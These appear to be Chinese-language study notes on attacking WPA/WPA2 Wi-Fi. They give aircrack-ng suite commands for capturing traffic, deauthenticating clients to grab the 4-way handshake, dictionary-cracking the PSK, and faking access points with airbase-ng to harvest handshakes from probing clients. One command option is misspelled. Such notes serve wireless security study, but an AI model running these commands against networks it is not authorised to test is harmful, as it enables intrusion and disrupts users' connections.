
# wpa攻击

* 条件

* PSK破解过程

* wpa攻击

## 条件

1. CPU资源
2. 时间
3. 字典质量：
     1. 网上共享的字典
     1. 泄露密码
     1. 地区电话号码段
     1. Crunch生成字典
     1. kali中自带的字典 ——>有些密码不符合要求，会自动过滤

## PSK破解过程

> 启动monitor  
      开始抓包并保存  
      Deauthentication攻击获取4步握手信息     //打掉连接，待它重连的时期获取4步握手信息  
      使用字典暴力破解  

``` 
airodump-ng wlan0mon --bassid MAC -c 11 -w wpa
aireplay-ng -0 2 -a BSSID的MAC -c STA的MAC wlan0mon
```

* 保存下来的信息

``` 
aircrack-ng -w xxx WPA-01.cap
```


### 只有客户端，无AP情况下的WPA密码破解
* 原理
>   客户端会发probe包，询问哪个是连接过得WiFi，泄露信息。

* 过程
``` 
    伪造AP，抓客户端MAC和他发送probe包要连接的AP，伪造一个这样的AP名进行四步握手。
    启动monitor    
    开始抓包并保存
    关键——>根据probe信息伪造相同ESSID的AP
    抓取四步握手中的前两个 包——>重要信息（Nonce1、Nonce2、MAC1、MAC2）
    使用字典暴力破解
//其实四步握手的前两步基本上就得到了重要信息（Nonce1、Nonce2、MAC1、MAC2），可以计算出PTK
PMK：(ESSID+Presharekey)进行4096的hash计算后生成的PMK。
```

* 创造、伪造AP
``` 
airbase-ng --essid AP名  -c 11 wlan0mon ————>OPEN方式
airbase-ng --essid AP名  -c 11 -z 2 wlan0mon————>WPA2、TKIP
airbase-ng --essid AP名  -c 11 -Z 4 wlan0mon————>WPA、CCMP
```


